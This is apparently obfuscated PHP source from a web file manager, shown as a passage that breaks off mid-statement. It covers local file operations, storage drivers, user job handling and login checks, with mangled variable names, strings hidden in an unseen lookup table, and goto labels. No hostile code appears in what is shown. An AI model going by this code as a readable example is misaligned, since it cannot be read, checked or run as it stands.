PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($Éã¼µíË) { if (substr($Éã¼µíË, 0, 2) == $_SERVER[Ï×Œõ”û][1477]) { $Éã¼µíË = BASIC_PATH . substr($Éã¼µíË, 2); } return $Éã¼µíË; } public function iconvApp($Şæ…©€¾) { $’ØíÑ˜ =& $_SERVER[Ï×Œõ”û]; global $config; return $this->iconvTo($Şæ…©€¾, $config[$’ØíÑ˜[1601]], $config[$’ØíÑ˜[1600]]); } public function iconvSystem($Ñ²ÀÚÆ) { $›àáÌË… =& $_SERVER[Ï×Œõ”û]; global $config; return $this->iconvTo($Ñ²ÀÚÆ, $config[$›àáÌË…[1600]], $config[$›àáÌË…[1601]]); } public function getPathOuter($ÜñÈ·šÊ) { $ª×Ÿ¼Çê =& $_SERVER[Ï×Œõ”û]; $øØ§³Ö = $this->iconvApp($this->pathBase); $ÜñÈ·šÊ = $this->iconvApp($ÜñÈ·šÊ); if (substr($øØ§³Ö, 0, 2) == $ª×Ÿ¼Çê[1477]) { $øØ§³Ö = BASIC_PATH . substr($øØ§³Ö, 2); } if (substr($ÜñÈ·šÊ, 0, 2) == $ª×Ÿ¼Çê[1477]) { $ÜñÈ·šÊ = BASIC_PATH . substr($ÜñÈ·šÊ, 2); } $øØ§³Ö = KodIO::clear($øØ§³Ö); $ÜñÈ·šÊ = KodIO::clear($ÜñÈ·šÊ); $ÜñÈ·šÊ = substr($ÜñÈ·šÊ, strlen($øØ§³Ö)); if (empty($this->pathDriver)) { return $ÜñÈ·šÊ; } return $this->pathDriver . $ª×Ÿ¼Çê[8] . ltrim($ÜñÈ·šÊ, $ª×Ÿ¼Çê[8]); } public function mkfile($ÈêãÁ©ğ, $ÑæÇ’³ = '', $Æ»˜º¡’ = REPEAT_RENAME) { $ÈêãÁ©ğ = $this->iconvSystem($ÈêãÁ©ğ); @touch($ÈêãÁ©ğ); if ($ÑæÇ’³) { file_put_contents($ÈêãÁ©ğ, $ÑæÇ’³); } @chmod($ÈêãÁ©ğ, $this->pathAuth); if (is_file($ÈêãÁ©ğ)) { return $this->getPathOuter($ÈêãÁ©ğ); } $this->writeLog(__FUNCTION__ . $_SERVER[Ï×Œõ”û][1612], !0); return !1; } public function mkdir($½¬ØŠó­, $ĞÏ†Âöß = REPEAT_SKIP) { $½¬ØŠó­ = $this->iconvSystem($½¬ØŠó­); if (is_dir($½¬ØŠó­)) { return $this->getPathOuter($½¬ØŠó­); } @mkdir($½¬ØŠó­, $this->pathAuth, !0); @chmod($½¬ØŠó­, $this->pathAuth); if (is_dir($½¬ØŠó­)) { return $this->getPathOuter($½¬ØŠó­); } $this->writeLog(__FUNCTION__ . $_SERVER[Ï×Œõ”û][1612], !0); return !1; } public function copyFile($Ú–±ÓÌ, $‹›©Ä©¯) { $this->mkdir($this->pathFather($‹›©Ä©¯)); $Ú–±ÓÌ = $this->iconvSystem($Ú–±ÓÌ); $‹›©Ä©¯ = $this->iconvSystem($‹›©Ä©¯); $ˆğ–û·· = copy_64($Ú–±ÓÌ, $‹›©Ä©¯); @chmod($‹›©Ä©¯, $this->pathAuth); if ($ˆğ–û··) { return $this->getPathOuter($‹›©Ä©¯); } $this->writeLog(__FUNCTION__ . $_SERVER[Ï×Œõ”û][1612], !0); return !1; } public function moveFile($¾ï¯‘Ã, $öÔÄÀÃ) { $this->mkdir($this->pathFather($öÔÄÀÃ)); $¾ï¯‘Ã = $this->iconvSystem($¾ï¯‘Ã); $öÔÄÀÃ = $this->iconvSystem($öÔÄÀÃ); $â–ÈèÊ‡ = intval(@rename($¾ï¯‘Ã, $öÔÄÀÃ)); if (!$â–ÈèÊ‡) { if ($â–ÈèÊ‡ = intval(@copy_64($¾ï¯‘Ã, $öÔÄÀÃ))) { @unlink($¾ï¯‘Ã); } } @chmod($öÔÄÀÃ, $this->pathAuth); if ($â–ÈèÊ‡) { return $this->getPathOuter($öÔÄÀÃ); } $this->writeLog(__FUNCTION__ . $_SERVER[Ï×Œõ”û][1612], !0); return !1; } public function movePath($¯ÊìÒ‡, $Íî‡„¦«, $–ĞõåÅô = false) { $óÜÜÏì± =& $_SERVER[Ï×Œõ”û]; $¯ÊìÒ‡ = $this->iconvSystem($¯ÊìÒ‡); $Íî‡„¦« = $this->iconvSystem($Íî‡„¦«); $Ìæ­›Æ = rtrim($Íî‡„¦«, $óÜÜÏì±[8]) . $óÜÜÏì±[8] . ($–ĞõåÅô ? $–ĞõåÅô : get_path_this($¯ÊìÒ‡)); if (file_exists($Ìæ­›Æ)) { return !1; } $Ùî•ÀûÀ = intval(@rename($¯ÊìÒ‡, $Ìæ­›Æ)); $Ùî•ÀûÀ = file_exists($Ìæ­›Æ); if ($Ùî•ÀûÀ) { return $this->getPathOuter($Ìæ­›Æ); } $this->writeLog(__FUNCTION__ . $óÜÜÏì±[1612], !0); return !1; } public function delFile($í¶¬˜™â) { $í¶¬˜™â = $this->iconvSystem($í¶¬˜™â); if (!@unlink($í¶¬˜™â)) { @chmod($í¶¬˜™â, $this->pathAuth); if (@unlink($í¶¬˜™â)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[Ï×Œõ”û][1612], !0); return !1; } return !0; } public function delFolder($‡­ìôŸ¿) { $à’´”ùİ =& $_SERVER[Ï×Œõ”û]; $‡­ìôŸ¿ = $this->iconvSystem($‡­ìôŸ¿); if (!is_dir($‡­ìôŸ¿)) { return !0; } if (!($ß¼Ï–èÅ = opendir($‡­ìôŸ¿))) { return !1; } while (($‘Ú¡ñ´á = readdir($ß¼Ï–èÅ)) !== !1) { if ($‘Ú¡ñ´á == $à’´”ùİ[10] || $‘Ú¡ñ´á == $à’´”ùİ[1422]) { continue; } $Òû¼Êœ = $‡­ìôŸ¿ . $à’´”ùİ[8] . $‘Ú¡ñ´á; if (is_file($Òû¼Êœ) || is_link($Òû¼Êœ)) { if (!unlink($Òû¼Êœ)) { chmod($Òû¼Êœ, $this->pathAuth); if (!unlink($Òû¼Êœ)) { return !1; } } } else { if (is_dir($Òû¼Êœ)) { chmod($Òû¼Êœ, $this->pathAuth); $Òû¼Êœ = $this->iconvApp($Òû¼Êœ); if (!$this->delFolder($Òû¼Êœ)) { return !1; } } } } closedir($ß¼Ï–èÅ); return rmdir($‡­ìôŸ¿); } public function rename($»Îãã¢, $¯ší‡ôë) { $½¼‚¦½¹ =& $_SERVER[Ï×Œõ”û]; $Æ ¥éÊò = $this->fileNameAuto($this->pathFather($»Îãã¢), $¯ší‡ôë); $Æ ¥éÊò = $this->iconvSystem($Æ ¥éÊò); $»Îãã¢ = $this->iconvSystem($»Îãã¢); $´Ñü€•• = $this->pathFather($»Îãã¢); $“ˆ¸µú™ = rtrim($´Ñü€••, $½¼‚¦½¹[8]) . $½¼‚¦½¹[8] . $Æ ¥éÊò; $ŞÁĞøÁ = @rename($»Îãã¢, $“ˆ¸µú™); $“ˆ¸µú™ = $this->iconvApp($“ˆ¸µú™); if ($ŞÁĞøÁ) { return $this->getPathOuter($“ˆ¸µú™); } $this->writeLog(__FUNCTION__ . $½¼‚¦½¹[1612], !0); return !1; } public function size($„ÙØ‚õÍ) { $„ÙØ‚õÍ = $this->iconvSystem($„ÙØ‚õÍ); return filesize_64($„ÙØ‚õÍ); } public function info($‡£Á„¶) { $‡£Á„¶ = $this->iconvSystem($‡£Á„¶); if ($this->isFolder($‡£Á„¶)) { return $this->folderInfo($‡£Á„¶); } else { if ($this->isFile($‡£Á„¶)) { return $this->fileInfo($‡£Á„¶); } } return !1; } protected function infoChildren($„Å¼£Ï, &$æƒ¹å¾Š, $†¥‰†¿ = true) { $ÇƒÚÚï =& $_SERVER[Ï×Œõ”û]; check_abort_echo(); $„Å¼£Ï = rtrim($„Å¼£Ï, $ÇƒÚÚï[8]) . $ÇƒÚÚï[8]; if ($†¥‰†¿) { $„Å¼£Ï = $this->iconvSystem($„Å¼£Ï); } if (!($¤Ì™ˆ‘· = @opendir($„Å¼£Ï))) { return; } while (($ Ğ¿ˆ§ = readdir($¤Ì™ˆ‘·)) !== !1) { if ($ Ğ¿ˆ§ == $ÇƒÚÚï[10] || $ Ğ¿ˆ§ == $ÇƒÚÚï[1422]) { continue; } $éı†…¹ = $„Å¼£Ï . $ Ğ¿ˆ§; if (is_file($éı†…¹) || is_link($éı†…¹)) { $æƒ¹å¾Š[$ÇƒÚÚï[80]]++; $æƒ¹å¾Š[$ÇƒÚÚï[79]] += filesize_64($éı†…¹); } else { if (is_dir($éı†…¹)) { $æƒ¹å¾Š[$ÇƒÚÚï[81]]++; $this->infoChildren($éı†…¹, $æƒ¹å¾Š, !1); } } } closedir($¤Ì™ˆ‘·); } private function folderInfo($õìëæ», $Ï÷¾ü¢ = false) { $®–¬³Çì =& $_SERVER[Ï×Œõ”û]; $õìëæ» = rtrim($õìëæ», $®–¬³Çì[8]) . $®–¬³Çì[8]; $ôë”‰ôÓ = $this->iconvApp($this->pathThis($õìëæ»)); if ($Ï÷¾ü¢) { return array($®–¬³Çì[32] => $ôë”‰ôÓ, $®–¬³Çì[87] => $this->getPathOuter($õìëæ»), $®–¬³Çì[33] => $®–¬³Çì[78]); } $ô»±¹Ï = array($®–¬³Çì[32] => $ôë”‰ôÓ, $®–¬³Çì[87] => $this->getPathOuter($õìëæ»), $®–¬³Çì[33] => $®–¬³Çì[78], $®–¬³Çì[233] => @filectime($õìëæ»), $®–¬³Çì[88] => @filemtime($õìëæ»), $®–¬³Çì[1616] => @fileatime($õìëæ»), $®–¬³Çì[1617] => is_readable($õìëæ»), $®–¬³Çì[1618] => is_writable($õìëæ»), $®–¬³Çì[1619] => get_mode($õìëæ»)); return $ô»±¹Ï; } private function fileInfo($¶ĞØÃŒØ, $£Êß¦ÀÔ = false) { $í²´Ê¸ =& $_SERVER[Ï×Œõ”û]; $ûû÷Ãıú = $this->iconvApp($this->pathThis($¶ĞØÃŒØ)); if ($£Êß¦ÀÔ) { return array($í²´Ê¸[32] => $ûû÷Ãıú, $í²´Ê¸[87] => $this->getPathOuter($¶ĞØÃŒØ), $í²´Ê¸[33] => $í²´Ê¸[232], $í²´Ê¸[79] => $this->size($¶ĞØÃŒØ), $í²´Ê¸[168] => $this->ext($ûû÷Ãıú)); } $ë”Ç•ÓÊ = array($í²´Ê¸[32] => $ûû÷Ãıú, $í²´Ê¸[87] => $this->getPathOuter($¶ĞØÃŒØ), $í²´Ê¸[33] => $í²´Ê¸[232], $í²´Ê¸[233] => @filectime($¶ĞØÃŒØ), $í²´Ê¸[88] => @filemtime($¶ĞØÃŒØ), $í²´Ê¸[1616] => @fileatime($¶ĞØÃŒØ), $í²´Ê¸[79] => $this->size($¶ĞØÃŒØ), $í²´Ê¸[168] => $this->ext($ûû÷Ãıú), $í²´Ê¸[1617] => is_readable($¶ĞØÃŒØ), $í²´Ê¸[1618] => is_writable($¶ĞØÃŒØ), $í²´Ê¸[1619] => get_mode($¶ĞØÃŒØ)); return $ë”Ç•ÓÊ; } public function exist($Ô„Üˆôö) { $Ô„Üˆôö = $this->iconvSystem($Ô„Üˆôö); return @file_exists($Ô„Üˆôö); } public function isFile($äßŞŸ¸) { $äßŞŸ¸ = $this->iconvSystem($äßŞŸ¸); return @is_file($äßŞŸ¸); } public function isFolder($°á±òœ³) { $°á±òœ³ = $this->iconvSystem($°á±òœ³); return @is_dir($°á±òœ³); } public function listPath($è—¡ö, $şÚı­æ¯ = false) { $¨òãŞŒµ =& $_SERVER[Ï×Œõ”û]; $è—¡ö = $this->iconvSystem($è—¡ö); $è—¡ö = rtrim($è—¡ö, $¨òãŞŒµ[8]) . $¨òãŞŒµ[8]; $¿ÈâøÔ® = array($¨òãŞŒµ[85] => array(), $¨òãŞŒµ[86] => array()); if (!($À‰ŞğÙ© = @opendir($è—¡ö))) { return $¿ÈâøÔ®; } while (($Ø²ºåÚş = readdir($À‰ŞğÙ©)) !== !1) { if ($Ø²ºåÚş == $¨òãŞŒµ[10] || $Ø²ºåÚş == $¨òãŞŒµ[1422]) { continue; } $Í‘üñ¾ = $è—¡ö . $Ø²ºåÚş; if (is_file($Í‘üñ¾)) { $¿ÈâøÔ®[$¨òãŞŒµ[86]][] = $this->fileInfo($Í‘üñ¾, $şÚı­æ¯); } else { $¿ÈâøÔ®[$¨òãŞŒµ[85]][] = $this->folderInfo($Í‘üñ¾, $şÚı­æ¯); } } closedir($À‰ŞğÙ©); return $¿ÈâøÔ®; } public function listAll($™š¾ôÁ¿, &$ˆ€¢”Ú¯ = array()) { $„õÂ¢˜¢ =& $_SERVER[Ï×Œõ”û]; $™š¾ôÁ¿ = $this->iconvSystem($™š¾ôÁ¿); $™š¾ôÁ¿ = rtrim($™š¾ôÁ¿, $„õÂ¢˜¢[8]) . $„õÂ¢˜¢[8]; if (!($ÀÅòÓ€Ø = @opendir($™š¾ôÁ¿))) { return $ˆ€¢”Ú¯; } while (($é×õË‹œ = readdir($ÀÅòÓ€Ø)) !== !1) { if ($é×õË‹œ == $„õÂ¢˜¢[10] || $é×õË‹œ == $„õÂ¢˜¢[1422]) { continue; } $„³ø´ • = $™š¾ôÁ¿ . $é×õË‹œ; $‘–·­ûÊ = is_dir($„³ø´ •) && !is_link($„³ø´ •) ? 1 : 0; $„³ø´ • = $‘–·­ûÊ ? $„³ø´ • . $„õÂ¢˜¢[8] : $„³ø´ •; $ˆ€¢”Ú¯[] = array($„õÂ¢˜¢[87] => $this->getPathOuter($„³ø´ •), $„õÂ¢˜¢[78] => $‘–·­ûÊ, $„õÂ¢˜¢[88] => intval(@filemtime($„³ø´ •)), $„õÂ¢˜¢[79] => $‘–·­ûÊ ? 0 : intval($this->size($„³ø´ •))); if ($‘–·­ûÊ) { $this->listAll($„³ø´ •, $ˆ€¢”Ú¯); } } closedir($ÀÅòÓ€Ø); return $ˆ€¢”Ú¯; } public function has($ûÖÈ”–, $Ö¤˜—Ì™ = false, $êÌ¾ìá = true) { $´Õ€ÔÎ¦ =& $_SERVER[Ï×Œõ”û]; $ûÖÈ”– = $this->iconvSystem($ûÖÈ”–); $ûÖÈ”– = rtrim($ûÖÈ”–, $´Õ€ÔÎ¦[8]) . $´Õ€ÔÎ¦[8]; if (!($€ÀÈæ» = @opendir($ûÖÈ”–))) { return !1; } $ÃíØªÁ = 0; $ã®˜ÉÙ· = 0; $øØ™¾’é = 0; while (($‘¹Äßï™ = readdir($€ÀÈæ»)) !== !1) { if ($‘¹Äßï™ == $´Õ€ÔÎ¦[10] || $‘¹Äßï™ == $´Õ€ÔÎ¦[1422]) { continue; } $ÛÊ²ÇĞ = $ûÖÈ”– . $‘¹Äßï™; if ($Ö¤˜—Ì™) { $øØ™¾’é++; if (@is_file($ÛÊ²ÇĞ)) { $ÃíØªÁ++; } else { $ã®˜ÉÙ·++; } if ($øØ™¾’é > 10000) { break; } continue; } if ($êÌ¾ìá) { if (@is_file($ÛÊ²ÇĞ)) { return !0; } } else { if (@is_dir($ÛÊ²ÇĞ . $´Õ€ÔÎ¦[8])) { return !0; } } } closedir($€ÀÈæ»); if ($Ö¤˜—Ì™) { return array($´Õ€ÔÎ¦[241] => $ÃíØªÁ, $´Õ€ÔÎ¦[242] => $ã®˜ÉÙ·); } return !1; } public function hashSimple($œğªÆ–) { $¾‰Îü =& $_SERVER[Ï×Œõ”û]; if (!$œğªÆ–) { return md5($¾‰Îü[12]); } $œğªÆ– = $this->iconvSystem($œğªÆ–); $¦È„—ë = $this->size($œğªÆ–); $†Î×ÚíÆ = 200; $ÏŠğî´õ = 50; if ($¦È„—ë <= $†Î×ÚíÆ * $ÏŠğî´õ) { return $this->hashMd5($œğªÆ–) . $¦È„—ë; } $Õ³ã¦Æ = $¾‰Îü[12]; $Ó÷¤ª÷æ = intval($¦È„—ë / $ÏŠğî´õ); $µ™ã³ÁÎ = fopen($œğªÆ–, $¾‰Îü[1620]); if (!$µ™ã³ÁÎ) { return $Õ³ã¦Æ; } for ($¦Ø‰ú¿… = 0; $¦Ø‰ú¿… < $ÏŠğî´õ; $¦Ø‰ú¿…++) { fseek_64($µ™ã³ÁÎ, $Ó÷¤ª÷æ * $¦Ø‰ú¿…); $Õ³ã¦Æ .= fread($µ™ã³ÁÎ, $†Î×ÚíÆ); } fseek_64($µ™ã³ÁÎ, $¦È„—ë - $†Î×ÚíÆ); $Õ³ã¦Æ .= fread($µ™ã³ÁÎ, $†Î×ÚíÆ); fclose($µ™ã³ÁÎ); return md5($Õ³ã¦Æ) . $¦È„—ë; } public function getContent($šÔ¯ è) { $šÔ¯ è = $this->iconvSystem($šÔ¯ è); return file_get_contents($šÔ¯ è); } public function setContent($¡ì±•¨É, $Š¬Ñ² = '') { $¡ì±•¨É = $this->iconvSystem($¡ì±•¨É); $¡Š®‹‹Ñ = @file_put_contents($¡ì±•¨É, $Š¬Ñ², LOCK_EX); if (!$¡Š®‹‹Ñ) { $this->writeLog(__FUNCTION__ . $_SERVER[Ï×Œõ”û][1612], !0); } clearstatcache(); @chmod($¡ì±•¨É, $this->pathAuth); return $¡Š®‹‹Ñ === !1 ? !1 : !0; } public function fileSubstr($•ÊÓœˆ, $¢¨ê‚®ö = 0, $¾“ë†Èğ = false) { $ÄË•ò—Ø =& $_SERVER[Ï×Œõ”û]; $•ÊÓœˆ = $this->iconvSystem($•ÊÓœˆ); if ($¾“ë†Èğ === !1) { $¾“ë†Èğ = $this->size($•ÊÓœˆ); } if ($¾“ë†Èğ <= 0) { return $ÄË•ò—Ø[12]; } $ÀÄ‚œâ… = fopen($•ÊÓœˆ, $ÄË•ò—Ø[1620]); if (!$ÀÄ‚œâ…) { return !1; } fseek_64($ÀÄ‚œâ…, $¢¨ê‚®ö); $ÑÊÔ³° = fread($ÀÄ‚œâ…, $¾“ë†Èğ); fclose($ÀÄ‚œâ…); if (!$ÑÊÔ³°) { $this->writeLog(__FUNCTION__ . $ÄË•ò—Ø[1612], !0); } return $ÑÊÔ³°; } public function upload($°ÚØ¢ ˜, $ƒ—ÓÙİá, $ÊËÆÊ¡İ = false, $¢¹ë„áµ = REPEAT_REPLACE) { if (!$ƒ—ÓÙİá || !@file_exists($ƒ—ÓÙİá)) { return !1; } if ($ÊËÆÊ¡İ) { return $this->moveFile($ƒ—ÓÙİá, $°ÚØ¢ ˜); } return $this->copyFile($ƒ—ÓÙİá, $°ÚØ¢ ˜); } public function setModifyTime($ìÀĞ®¢ñ, $ä–·óó = '') { @touch($ìÀĞ®¢ñ, intval($ä–·óó)); } public function download($¬É–ı›Ô, $—ÔËÀ×İ) { return $this->iconvSystem($¬É–ı›Ô); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($•ïíºÉ) { parent::__construct($•ïíºÉ); $this->setSignVersion($_SERVER[Ï×Œõ”û][249]); } public function fileOutImage($«”øøÏ, $Á¸ğˆ™û = 250) { $ß“Ïà®Ê =& $_SERVER[Ï×Œõ”û]; if ($this->size($«”øøÏ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($«”øøÏ, $Á¸ğˆ™û); } $ĞÀÍÇ = array($ß“Ïà®Ê[1621] => $ß“Ïà®Ê[1622] . $Á¸ğˆ™û . $ß“Ïà®Ê[1623]); $†ˆæ¯Ô = $this->link($«”øøÏ, $ĞÀÍÇ); $this->fileOutLink($†ˆæ¯Ô); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($àóå… ) { parent::__construct($àóå… ); $this->setSignVersion($_SERVER[Ï×Œõ”û][249]); } public function uploadFormData($‡ş”±î, $’Ó±¢š = 3600) { return $this->uploadFormDataV2($‡ş”±î, $’Ó±¢š); } } goto d³¥Óø¦ßÆ; c³éƒÆÀ¿: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\56\x6a\157\142\x4c\x69\x73\164"; public $field = array("\x6e\x61\155\145", "\x64\145\x73\x63", "\163\157\162\x74"); const JOB_KEY = "\x73\145\x6c\146\112\157\x62\x4c\151\x73\164"; public function listData($µ¤ë³“‰ = false, $œ‘¶Ù¡ = "\x73\x6f\x72\164", $÷¦¿‰³¼ = false) { return parent::listData($µ¤ë³“‰, $œ‘¶Ù¡, $÷¦¿‰³¼); } public function remove($‹€Û–Ôú) { return parent::remove($‹€Û–Ôú); } public function add($µëÙ¯ı) { $­ÆÔÖÓ‘ =& $_SERVER[Ï×Œõ”û]; if ($this->findByName($µëÙ¯ı[$­ÆÔÖÓ‘[32]])) { return !1; } $µëÙ¯ı[$­ÆÔÖÓ‘[2159]] = $this->getSort(); return parent::insert($µëÙ¯ı); } private function getSort() { $¬ëù³Á =& $_SERVER[Ï×Œõ”û]; $Ì¾“àíê = parent::listData(); $€Š† Î» = array_to_keyvalue($Ì¾“àíê, $¬ëù³Á[12], $¬ëù³Á[2159]); return empty($€Š† Î») ? 0 : max($€Š† Î») + 1; } public function update($ÛËíŸÅ¬, $š¨·™¼ï) { $ËÜù™¾ =& $_SERVER[Ï×Œõ”û]; $—‘éÙ = parent::listData($ÛËíŸÅ¬); $×ÊÜ—š = $this->findByName($š¨·™¼ï[$ËÜù™¾[32]]); if (!$—‘éÙ || $×ÊÜ—š && $×ÊÜ—š[$ËÜù™¾[484]] != $—‘éÙ[$ËÜù™¾[484]]) { return !1; } return parent::update($ÛËíŸÅ¬, $š¨·™¼ï); } public function setUserJob($¿½øÓ˜, $½­²˜İû) { $•–¯öµë =& $_SERVER[Ï×Œõ”û]; if (!is_array($½­²˜İû)) { $½­²˜İû = array($½­²˜İû); } $§Ô øÔ× = parent::listData(); $±š”™ÓÇ = array_to_keyvalue($§Ô øÔ×, $•–¯öµë[32]); $ÚÔÕØÃ… = $•–¯öµë[464]; foreach ($½­²˜İû as $ÜãÎ©İ‡) { if ($±š”™ÓÇ[$ÜãÎ©İ‡]) { $ÚÔÕØÃ… .= $±š”™ÓÇ[$ÜãÎ©İ‡][$•–¯öµë[484]] . $•–¯öµë[50]; } else { $Œğõª¼¼ = $this->add($ÜãÎ©İ‡); $ÚÔÕØÃ… .= $Œğõª¼¼ . $•–¯öµë[50]; } } $ÚÔÕØÃ… = rtrim($ÚÔÕØÃ…, $•–¯öµë[50]); Model($•–¯öµë[622])->metaSet($¿½øÓ˜, self::JOB_KEY, $ÚÔÕØÃ…); } public function getUserJob($Ì³™•´£) { $ê€ôëôµ = Model($_SERVER[Ï×Œõ”û][622])->metaGet($Ì³™•´£); return $this->getUserJobInfo($ê€ôëôµ[self::JOB_KEY]); } public function getUserJobInfo($…êœåã) { $±ò§Ú¦À =& $_SERVER[Ï×Œõ”û]; $ü¬ñûô˜ = explode($±ò§Ú¦À[50], $…êœåã); $ÙÏ¥•ò = parent::listData(); $ÙÏ¥•ò = array_remove_key($ÙÏ¥•ò, $±ò§Ú¦À[233]); $èğƒò‰Ò = array(); foreach ($ü¬ñûô˜ as $ş™Šû¹Š) { if (isset($ÙÏ¥•ò[$ş™Šû¹Š])) { $èğƒò‰Ò[] = $ÙÏ¥•ò[$ş™Šû¹Š]; } } return $èğƒò‰Ò; } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\162"; protected $tableMeta = array("\x74\141\142\154\145\x4e\x61\x6d\145" => "\165\163\145\x72\137\155\x65\164\141", "\155\145\x74\141\x46\x69\145\154\144" => "\165\163\x65\x72\x49\104"); protected $simpleField = "\x75\163\x65\162\x49\104\x2c\156\151\143\153\116\x61\155\x65\54\x6e\141\155\145\54\x61\166\141\164\141\x72\54\x73\145\x78\x2c\163\164\x61\x74\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($×šôò‘ƒ) { $ÚÊ¤« =& $_SERVER[Ï×Œõ”û]; $ì›×ÚØ² = $ÚÊ¤«[2631]; return array($ÚÊ¤«[2216] => array($×šôò‘ƒ[0], $ì›×ÚØ²), $ÚÊ¤«[2218] => array($×šôò‘ƒ[0], $ì›×ÚØ²), $ÚÊ¤«[2632] => array($×šôò‘ƒ[0], $ì›×ÚØ²)); } protected function ___getInfo($²¬¤şÂä) { $ÏñˆéÀ© = $this->getInfoSimple($²¬¤şÂä); if (!$ÏñˆéÀ© || !is_array($ÏñˆéÀ©)) { return array(); } return $this->_getInfoApply($ÏñˆéÀ©); } protected function ___getInfoFull($îáÚ­ôõ) { $òùØ²ã¤ = $this->getInfoSimple($îáÚ­ôõ); if (!$òùØ²ã¤ || !is_array($òùØ²ã¤)) { return array(); } return $this->_getInfoApply($òùØ²ã¤, !0); } protected function ___getInfoSimple($ÒÎÜ›ñï) { $®¬á›´ô =& $_SERVER[Ï×Œõ”û]; if (!$ÒÎÜ›ñï) { return array(); } $š‰¡ÔÃ² = $this->where(array($®¬á›´ô[1547] => intval($ÒÎÜ›ñï)))->find(); if (!$š‰¡ÔÃ² || !is_array($š‰¡ÔÃ²)) { return array(); } $š‰¡ÔÃ²[$®¬á›´ô[2328]] = Action($®¬á›´ô[2329])->parseUrl($š‰¡ÔÃ²[$®¬á›´ô[2328]]); return $š‰¡ÔÃ²; } private function _getInfoApply($Å²’á±´, $Íè²¢¼ó = false) { $”û®ñ¬§ =& $_SERVER[Ï×Œõ”û]; if (!$Å²’á±´) { return $Å²’á±´; } $é‘æ‡ı = md5($”û®ñ¬§[2633] . $Å²’á±´[$”û®ñ¬§[1007]] . $”û®ñ¬§[2634] . $Å²’á±´[$”û®ñ¬§[32]]); $Å²’á±´ = $this->_listDataApplyItem($Å²’á±´); $¡é†±é¡ = Model($”û®ñ¬§[1487])->metaGet($Å²’á±´[$”û®ñ¬§[90]][$”û®ñ¬§[193]]); $Å²’á±´[$”û®ñ¬§[2635]] = $é‘æ‡ı; $Å²’á±´[$”û®ñ¬§[90]][$”û®ñ¬§[2420]] = isset($¡é†±é¡[$”û®ñ¬§[2421]]) ? $¡é†±é¡[$”û®ñ¬§[2421]] : null; if ($Íè²¢¼ó) { $Å²’á±´[$”û®ñ¬§[560]] = $this->metaGet($Å²’á±´[$”û®ñ¬§[1547]]); } return $Å²’á±´; } protected function getInfoSimpleOuter($î¿“Æ®) { $«–Ùª¥‰ =& $_SERVER[Ï×Œõ”û]; if (!$î¿“Æ® || $î¿“Æ® == 0) { return array($«–Ùª¥‰[1547] => $«–Ùª¥‰[230], $«–Ùª¥‰[32] => $«–Ùª¥‰[175] . LNG($«–Ùª¥‰[2636]) . $«–Ùª¥‰[177], $«–Ùª¥‰[2328] => STATIC_PATH . $«–Ùª¥‰[2637]); } $é İÅ½ = $this->cacheFunctionGet($«–Ùª¥‰[2227], $î¿“Æ®); $¶ş’ÚÍ = array_field_key($é İÅ½, explode($«–Ùª¥‰[50], $this->simpleField)); if (!$¶ş’ÚÍ) { return array($«–Ùª¥‰[1547] => $«–Ùª¥‰[1331], $«–Ùª¥‰[32] => $«–Ùª¥‰[175] . LNG($«–Ùª¥‰[2638]) . $«–Ùª¥‰[177], $«–Ùª¥‰[2328] => STATIC_PATH . $«–Ùª¥‰[2639]); } $¶ş’ÚÍ[$«–Ùª¥‰[2328]] = Action($«–Ùª¥‰[2329])->parseUrl($¶ş’ÚÍ[$«–Ùª¥‰[2328]]); return $¶ş’ÚÍ; } protected function groupUser($ì™Ö¦—Ó) { } public static function errorLang($’€µ·à¡) { $Õ©éå‡Ô =& $_SERVER[Ï×Œõ”û]; $¶Í¥–«ñ = array(self::ERROR_USER_NOT_EXISTS => $Õ©éå‡Ô[2640], self::ERROR_USER_PASSWORD_ERROR => $Õ©éå‡Ô[2641], self::ERROR_USER_EXIST_NAME => $Õ©éå‡Ô[2642], self::ERROR_USER_EXIST_PHONE => $Õ©éå‡Ô[2643], self::ERROR_USER_EXIST_EMAIL => $Õ©éå‡Ô[2644], self::ERROR_USER_LOGIN_LOCK => $Õ©éå‡Ô[2645], self::ERROR_IP_NOT_ALLOW => $Õ©éå‡Ô[2646], self::ERROR_USER_EXIST_NICKNAME => $Õ©éå‡Ô[2647]); $Ä‚² Û€ = LNG($¶Í¥–«ñ[$’€µ·à¡]); if ($’€µ·à¡ == self::ERROR_USER_LOGIN_LOCK) { $¾‚Ó–‰Ø = (int) Model($Õ©éå‡Ô[1443])->get($Õ©éå‡Ô[2648]); if ($¾‚Ó–‰Ø > 60) { $Ä‚² Û€ = str_replace($Õ©éå‡Ô[91], ceil($¾‚Ó–‰Ø / 60), $Ä‚² Û€); } } return $Ä‚² Û€; } protected function metaSet($–šûù€¾, $­ÙÔšİ = null, $éÚ¿û¾ = null) { $this->clearCache($–šûù€¾); return parent::metaSet($–šûù€¾, $­ÙÔšİ, $éÚ¿û¾); } public function getInfoByMeta($àÒ“áë«, $§–²™•¥) { $åä¸ß»‚ =& $_SERVER[Ï×Œõ”û]; $Äû™ì§Ç = Model($åä¸ß»‚[2649])->where(array($åä¸ß»‚[95] => $àÒ“áë«, $åä¸ß»‚[452] => $§–²™•¥))->find(); if ($Äû™ì§Ç) { return $this->getInfo($Äû™ì§Ç[$åä¸ß»‚[1547]]); } return !1; } public function userLoginCheck($©ä½Ô–², $¬ÃåÁòˆ, $„Á‚¾è© = false) { $ò¯£¾¥ß =& $_SERVER[Ï×Œõ”û]; $ˆØä›Ëä = $this->userLoginFind($©ä½Ô–²); if (!$ˆØä›Ëä) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ˆØä›Ëä[$ò¯£¾¥ß[1547]], $¬ÃåÁòˆ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $„Á‚¾è© ? 